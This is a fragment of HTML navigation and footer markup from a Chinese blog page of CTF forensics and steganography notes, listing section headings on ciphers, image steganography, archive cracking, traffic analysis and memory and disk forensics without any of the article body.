class="nav-text">邮件(STMP)流量分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%97%A0%E7%BA%BF%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-text">无线流量分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SLL%E3%80%81TLS%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-text">SLL、TLS加密流量分析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#PFX%E8%AF%81%E4%B9%A6%E5%AF%BC%E5%85%A5"><span class="nav-text">PFX证书导入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#MMTLS-%E5%BE%AE%E4%BF%A1%E5%AE%89%E5%85%A8%E9%80%9A%E4%BF%A1%E5%8D%8F%E8%AE%AE"><span class="nav-text">MMTLS - 微信安全通信协议</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#VPN%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-text">VPN流量分析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Shadowsocks%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-text">Shadowsocks流量分析</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#VMess-V2ray-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-text">VMess(V2ray)流量分析</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ADS-B%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-text">ADS-B流量分析</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8D%9F%E5%9D%8F%E7%9A%84%E6%B5%81%E9%87%8F%E5%8C%85%E5%88%86%E6%9E%90"><span class="nav-text">损坏的流量包分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%8E%E6%B5%81%E9%87%8F%E5%8C%85%E4%B8%AD%E6%89%BE%E5%BC%82%E5%B8%B8%E6%B5%81%E9%87%8F"><span class="nav-text">从流量包中找异常流量</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81"><span class="nav-text">内存取证</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Windows%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81"><span class="nav-text">Windows内存取证</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Volatility2"><span class="nav-text">Volatility2</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Volatility3"><span class="nav-text">Volatility3</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Linux%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81"><span class="nav-text">Linux内存取证</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%B6%E4%BD%9C-Profile-Vol2-%E7%9A%84%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B"><span class="nav-text">制作  Profile(Vol2)  的详细过程</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%B6%E4%BD%9C-symbols-Vol3-%E7%9A%84%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B"><span class="nav-text">制作  symbols(Vol3)  的详细过程</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Volatility2-2"><span class="nav-text">Volatility2</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Volatility3-2"><span class="nav-text">Volatility3</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MacOS%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81"><span class="nav-text">MacOS内存取证</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Volatility2-3"><span class="nav-text">Volatility2</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Volatility3-3"><span class="nav-text">Volatility3</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%AF%86%E5%88%AB%E4%B8%8D%E5%87%BA%E5%86%85%E5%AD%98%E9%95%9C%E5%83%8F%E7%89%88%E6%9C%AC%E7%9A%84%E5%8F%96%E8%AF%81"><span class="nav-text">识别不出内存镜像版本的取证</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%94%A8%E6%9D%A5%E5%88%B6%E4%BD%9C%E5%86%85%E5%AD%98%E9%95%9C%E5%83%8F%E7%9A%84%E5%B7%A5%E5%85%B7"><span class="nav-text">用来制作内存镜像的工具</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#dmp%E6%96%87%E4%BB%B6"><span class="nav-text">dmp文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#dump%E6%96%87%E4%BB%B6"><span class="nav-text">dump文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#mem%E6%96%87%E4%BB%B6"><span class="nav-text">mem文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#raw%E6%96%87%E4%BB%B6"><span class="nav-text">raw文件</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A3%81%E7%9B%98%E5%8F%96%E8%AF%81"><span class="nav-text">磁盘取证</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#VeraCrypt"><span class="nav-text">VeraCrypt</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%96%E8%AF%81%E5%A4%A7%E5%B8%88"><span class="nav-text">取证大师</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fat%E6%96%87%E4%BB%B6"><span class="nav-text">fat文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#VMDK%E6%96%87%E4%BB%B6"><span class="nav-text">VMDK文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#E01%E6%96%87%E4%BB%B6"><span class="nav-text">E01文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ad1%E6%96%87%E4%BB%B6"><span class="nav-text">ad1文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#VHD%E6%96%87%E4%BB%B6"><span class="nav-text">VHD文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A3%81%E7%9B%98%E5%8F%96%E8%AF%81%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF"><span class="nav-text">磁盘取证的一些思路</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8BPowershell%E7%9A%84%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95"><span class="nav-text">查看Powershell的历史记录</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BB%BF%E7%9C%9F%E5%8F%96%E8%AF%81"><span class="nav-text">仿真取证</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BD%91%E7%AB%99%E5%8F%96%E8%AF%81"><span class="nav-text">网站取证</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81"><span class="nav-text">服务器取证</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Mysql5-7-%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BB%8Eqp-xb%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D%E6%95%B0%E6%8D%AE"><span class="nav-text">Mysql5.7 数据库从qp.xb文件恢复数据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B6%E4%BB%96"><span class="nav-text">其他</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1%E3%80%81%E7%A3%81%E7%9B%98%E6%81%A2%E5%A4%8D"><span class="nav-text">1、磁盘恢复</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2%E3%80%81%E6%B5%8F%E8%A7%88%E5%99%A8%E7%99%BB%E5%BD%95%E5%87%AD%E8%AF%81%E7%A0%B4%E8%A7%A3"><span class="nav-text">2、浏览器登录凭证破解</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E9%A2%98%E7%9B%AE"><span class="nav-text">其他题目</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#FAS%E6%96%87%E4%BB%B6"><span class="nav-text">FAS文件</span></a></li></ol></li></ol>
    </div>
</div>

            </div>
        
    </div>
</div>


                
            </div>
        </div>

        <div class="page-main-content-bottom border-box">
            
<footer class="footer border-box">
    <div class="copyright-info info-item">
        &copy;&nbsp;<span>2023</span>&nbsp;-&nbsp;2025
        
            &nbsp;</i>&nbsp;&nbsp;<a href="/">C3ngH</a>
        
    </div>

    

    
        <div class="count-info info-item">
            
                <span class="count-item border-box word">
                    <span class="item-type border-box">总字数</span>
                    <span class="item-value border-box word">85k</span>
                </span>
            

            
                <span class="count-item border-box uv">
                    <span class="item-type border-box">访客数</span>
                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
                </span>
            

            
                <span class="count-item border-box pv">
                    <span class="item-type border-box">访问量</span>
                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
                </span>
            
        </div>
    

    
</footer>

        </div>
    </div>

    <!-- post tools -->
    
        <div class="post-tools right-toc">
            <div class="post-tools-container border-box">
    <ul class="post-tools-list border-box">
        <!-- PC encrypt again -->
        

        <!-- PC TOC show toggle -->
        
            <li class="tools-item flex-center toggle-show-toc">
                <i class="fas fa-list"></i>
            </li>
        

        <!-- PC go comment -->
        
            <li class="tools-item flex-center go-to-comments">
                <i class="fas fa-comment"></i>
                <span class="post-comments-count"></span>
            </li>
        

        <!-- PC full screen -->
        <li class="tools-item flex-center full-screen">
            <i class="fa-solid fa-expand"></i>
        </li>
    </ul>
</div>

        </div>
    

    <!-- side tools -->
    <div class="side-tools">
        <div class="side-tools-container border-box ">
    <ul class="side-tools-list side-tools-show-handle border-box">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <!-- toggle mode -->
        
            <li class="tools-item tool-toggle-theme-mode flex-center">
                <i class="fas fa-moon"></i>
            </li>
        

        <!-- rss -->
        

        <!-- to bottom -->
        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list border-box">
        
            <li class="tools-item toggle-show-toc-tablet flex-center">
                <i class="fas fa-list"></i>
            </li>
        

        
            <li class="tools-item go-to-comments-tablet flex-center">
                <i class="fas fa-comment"></i>
            </li>
        

        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>

        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
            <i class="arrow fas fa-arrow-up"></i>
            <span class="percent"></span>
        </li>
    </ul>
</div>

    </div>

    <!-- image mask -->
    <div class="zoom-in-image-mask">
    <img class="zoom-in-image">
</div>


    <!-- local search -->
    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="搜索..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="close-popup-btn">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

    <!-- tablet toc -->
    
        <div class="tablet-post-toc-mask">
            <div class="tablet-post-toc">
                <div class="post-toc-wrap border-box">
    <div class="post-toc border-box">
        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%96%E7%A0%81-%E5%8A%A0%E5%AF%86"><span class="nav-text">编码&#x2F;加密</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Base%E5%AE%B6%E6%97%8F"><span class="nav-text">Base家族</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MD5"><span class="nav-text">MD5</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Byte%E7%B1%BB%E5%9E%8B"><span class="nav-text">Byte类型</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#emoji-AES"><span class="nav-text">emoji-AES</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#emoji%E8%A7%A3%E7%A0%81"><span class="nav-text">emoji解码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BA%8C%E7%BB%B4%E7%A0%81"><span class="nav-text">二维码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A2%91%E6%AC%A1%E5%88%86%E6%9E%90"><span class="nav-text">频次分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%91%A9%E6%96%AF%E7%94%B5%E7%A0%81"><span class="nav-text">摩斯电码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%B4%E5%90%89%E5%B0%BC%E4%BA%9A%E5%AF%86%E7%A0%81"><span class="nav-text">维吉尼亚密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%8C%E5%B0%94%E5%AF%86%E7%A0%81"><span class="nav-text">希尔密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Rabbit%E5%8A%A0%E5%AF%86"><span class="nav-text">Rabbit加密</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B9%82%E6%95%B0%E5%8A%A0%E5%AF%86-%E4%BA%91%E5%BD%B1%E5%AF%86%E7%A0%81"><span class="nav-text">幂数加密&#x2F;云影密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9B%BC%E5%BD%BB%E6%96%AF%E7%89%B9%E7%BC%96%E7%A0%81-%E5%B7%AE%E5%88%86%E6%9B%BC%E5%BD%BB%E6%96%AF%E7%89%B9%E7%BC%96%E7%A0%81"><span class="nav-text">曼彻斯特编码 &amp; 差分曼彻斯特编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A4%BE%E4%BC%9A%E4%B8%BB%E4%B9%89%E6%A0%B8%E5%BF%83%E4%BB%B7%E5%80%BC%E8%A7%82%E7%BC%96%E7%A0%81"><span class="nav-text">社会主义核心价值观编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9F%B3%E7%AC%A6%E8%A7%A3%E5%AF%86"><span class="nav-text">音符解密</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%95%B2%E5%87%BB%E7%A0%81"><span class="nav-text">敲击码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%B2%E6%96%87"><span class="nav-text">盲文</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Polybius%E5%AF%86%E7%A0%81"><span class="nav-text">Polybius密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#AES%E5%8A%A0%E5%AF%86"><span class="nav-text">AES加密</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%83%E7%89%B9%E5%B7%B4%E4%BB%80%E7%A0%81-Atbash"><span class="nav-text">埃特巴什码(Atbash)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DNA%E7%BC%96%E7%A0%81"><span class="nav-text">DNA编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%BF%E5%B0%84%E5%AF%86%E7%A0%81"><span class="nav-text">仿射密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Brainfuck"><span class="nav-text">Brainfuck</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Ook%EF%BC%81"><span class="nav-text">Ook！</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8E%E4%BD%9B%E8%AE%BA%E7%A6%85-%E4%B8%8E%E7%86%8A%E8%AE%BA%E9%81%93-%E5%85%BD%E8%AF%AD%E5%8A%A0%E5%AF%86"><span class="nav-text">与佛论禅 &#x2F; 与熊论道 &#x2F; 兽语加密</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A9%BA%E7%99%BD%E6%A0%BC-%E6%97%A0%E5%AD%97%E5%A4%A9%E4%B9%A6%EF%BC%9A"><span class="nav-text">空白格 &#x2F; 无字天书：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Serpent%E8%A7%A3%E5%AF%86"><span class="nav-text">Serpent解密</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9B%B6%E5%AE%BD%E9%9A%90%E5%86%99"><span class="nav-text">零宽隐写</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Gronsfeld%E5%AF%86%E7%A0%81"><span class="nav-text">Gronsfeld密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#UUencode%E7%BC%96%E7%A0%81"><span class="nav-text">UUencode编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#AAencode%E7%BC%96%E7%A0%81"><span class="nav-text">AAencode编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XXencode%E7%BC%96%E7%A0%81"><span class="nav-text">XXencode编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#snow%E9%9A%90%E5%86%99"><span class="nav-text">snow隐写</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%AD%E6%96%87%E7%94%B5%E6%8A%A5"><span class="nav-text">中文电报</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Quote-Printable%E7%BC%96%E7%A0%81"><span class="nav-text">Quote-Printable编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%AD%E6%96%87ASCII%E7%A0%81"><span class="nav-text">中文ASCII码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%B9%E6%A0%B9%E5%AF%86%E7%A0%81"><span class="nav-text">培根密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%94%9F%E6%96%A4%E6%8B%B7"><span class="nav-text">锟斤拷</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%94%AE%E7%9B%98%E5%9D%90%E6%A0%87%E5%AF%86%E7%A0%81"><span class="nav-text">键盘坐标密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A6%8F%E5%B0%94%E6%91%A9%E6%96%AF-%E8%B7%B3%E8%88%9E%E7%9A%84%E5%B0%8F%E4%BA%BA"><span class="nav-text">福尔摩斯 跳舞的小人</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%89%8B%E6%9C%BA%E4%B9%9D%E5%AE%AB%E6%A0%BC%E9%94%AE%E7%9B%98%E5%AF%86%E7%A0%81"><span class="nav-text">手机九宫格键盘密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E7%BC%96%E7%A8%8B%E4%BB%A3%E7%A0%81%E7%94%BB%E5%9B%BE"><span class="nav-text">利用编程代码画图</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#spammimic%E7%BC%96%E7%A0%81"><span class="nav-text">spammimic编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#malbolge"><span class="nav-text">malbolge</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PDU%E7%BC%96%E7%A0%81"><span class="nav-text">PDU编码</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E7%A0%81%E5%B7%A5%E5%85%B7"><span class="nav-text">解码工具</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Ciphey"><span class="nav-text">Ciphey</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CyberChef"><span class="nav-text">CyberChef</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Basecrack"><span class="nav-text">Basecrack</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9A%8F%E6%B3%A2%E9%80%90%E6%B5%81"><span class="nav-text">随波逐流</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%A4%B4"><span class="nav-text">文件头</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%BE%E7%89%87%E9%80%9A%E7%94%A8%E9%9A%90%E5%86%99"><span class="nav-text">图片通用隐写</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B1%9E%E6%80%A7-%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF"><span class="nav-text">属性-详细信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#010Editor%E6%A3%80%E6%9F%A5%E6%96%87%E4%BB%B6%E6%9C%AB%E5%B0%BE"><span class="nav-text">010Editor检查文件末尾</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#010Editor%E6%A3%80%E6%9F%A5%E6%96%87%E4%BB%B6%E5%A4%B4"><span class="nav-text">010Editor检查文件头</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#binwalk-foremost"><span class="nav-text">binwalk &amp; foremost</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%B2%E6%B0%B4%E5%8D%B0%E9%9A%90%E5%86%99"><span class="nav-text">盲水印隐写</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A2%91%E5%9F%9F%E7%9B%B2%E6%B0%B4%E5%8D%B0"><span class="nav-text">频域盲水印</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9B%BE%E7%89%87%E5%88%86%E7%A6%BB-%E6%8B%BC%E6%8E%A5"><span class="nav-text">图片分离 &#x2F; 拼接</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#OurSecret%E9%9A%90%E5%86%99"><span class="nav-text">OurSecret隐写</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8B%BC%E5%9B%BE"><span class="nav-text">拼图</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%91%E9%82%BB%E6%B3%95%E7%BC%A9%E6%94%BE%E5%9B%BE%E7%89%87"><span class="nav-text">近邻法缩放图片</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pixeljihad"><span class="nav-text">pixeljihad</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9A%90%E5%86%99%E6%96%87%E6%9C%AC%E8%97%8F%E5%9C%A8%E5%8E%9F%E5%9B%BE%E7%89%87%E5%92%8C%E9%9A%90%E5%86%99%E6%96%87%E4%BB%B6%E4%B8%AD%E9%97%B4"><span class="nav-text">隐写文本藏在原图片和隐写文件中间</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E5%8F%96%E5%9B%BE%E7%89%87%E4%B8%AD%E7%AD%89%E8%B7%9D%E7%9A%84%E5%83%8F%E7%B4%A0%E7%82%B9%E5%BE%97%E5%88%B0%E9%9A%90%E5%86%99%E7%9A%84%E5%9B%BE%E7%89%87"><span class="nav-text">提取图片中等距的像素点得到隐写的图片</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#silenteye%E9%9A%90%E5%86%99"><span class="nav-text">silenteye隐写</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9B%BE%E7%89%87%E6%8A%A5%E9%94%99%E6%94%B9%E5%AE%BD%E9%AB%98%E5%90%8E%E5%9B%BE%E7%89%87%E6%97%A0%E5%8F%98%E5%8C%96"><span class="nav-text">图片报错改宽高后图片无变化</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DeEgger-Embedder%E9%9A%90%E5%86%99"><span class="nav-text">DeEgger Embedder隐写</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#EXIF%E9%9A%90%E5%86%99"><span class="nav-text">EXIF隐写</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#npiet"><span class="nav-text">npiet</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%8C%AB%E8%84%B8%E5%8F%98%E6%8D%A2"><span class="nav-text">猫脸变换</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PNG%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99"><span class="nav-text">PNG图片隐写</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#CRC%E9%94%99%E8%AF%AF"><span class="nav-text">CRC错误</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#LSB%E9%9A%90%E5%86%99"><span class="nav-text">LSB隐写</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#cloacked-pixel"><span class="nav-text">cloacked-pixel</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#IDAT%E5%9D%97%E9%9A%90%E5%86%99"><span class="nav-text">IDAT块隐写</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#apngdis-gui"><span class="nav-text">apngdis_gui</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CVE-2023-28303-%E6%88%AA%E5%9B%BE%E5%B7%A5%E5%85%B7%E6%BC%8F%E6%B4%9E"><span class="nav-text">CVE-2023-28303 截图工具漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#stegpy%E9%9A%90%E5%86%99"><span class="nav-text">stegpy隐写</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JPG%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99"><span class="nav-text">JPG图片隐写</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#outguess%E9%9A%90%E5%86%99"><span class="nav-text">outguess隐写</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#F5-steganography-master%EF%BC%88F5%E9%9A%90%E5%86%99%EF%BC%89"><span class="nav-text">F5-steganography-master（F5隐写）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#JPHS%E9%9A%90%E5%86%99"><span class="nav-text">JPHS隐写</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#steghide%E9%9A%90%E5%86%99"><span class="nav-text">steghide隐写</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BMP%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99"><span class="nav-text">BMP图片隐写</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#wbStego4open%E9%9A%90%E5%86%99"><span class="nav-text">wbStego4open隐写</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GIF%E9%9A%90%E5%86%99"><span class="nav-text">GIF隐写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%E7%BB%B4%E7%A0%81%E9%9A%90%E5%86%99"><span class="nav-text">二维码隐写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Webp%E9%9A%90%E5%86%99"><span class="nav-text">Webp隐写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RAW%E3%80%81ARW%E6%96%87%E4%BB%B6%E9%9A%90%E5%86%99"><span class="nav-text">RAW、ARW文件隐写</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#RAW%E7%9A%84LSB%E9%9A%90%E5%86%99"><span class="nav-text">RAW的LSB隐写</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%B4%E6%8E%A5%E6%94%B9%E5%90%8E%E7%BC%80%E4%B8%BA-data%EF%BC%8C%E7%84%B6%E5%90%8E%E6%8B%96%E5%85%A5Gimp%E5%8D%B3%E5%8F%AF"><span class="nav-text">直接改后缀为.data，然后拖入Gimp即可</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%8B%E7%BC%A9%E5%8C%85"><span class="nav-text">压缩包</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#zip%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84"><span class="nav-text">zip文件结构</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#rar%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84"><span class="nav-text">rar文件结构</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%8B%E7%BC%A9%E5%8C%85%E4%BC%AA%E5%8A%A0%E5%AF%86"><span class="nav-text">压缩包伪加密</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#zip%E6%96%87%E4%BB%B6%EF%BC%9A"><span class="nav-text">zip文件：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#rar%E6%96%87%E4%BB%B6%EF%BC%9A"><span class="nav-text">rar文件：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CRC%E7%88%86%E7%A0%B4%EF%BC%88%E5%8E%8B%E7%BC%A9%E5%8C%85%E4%B8%AD%E6%96%87%E4%BB%B6%E6%AF%94%E8%BE%83%E5%B0%8F%E7%9A%84%E6%97%B6%E5%80%99%EF%BC%89"><span class="nav-text">CRC爆破（压缩包中文件比较小的时候）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB"><span class="nav-text">明文攻击</span></a><ol class="nav-child"><li 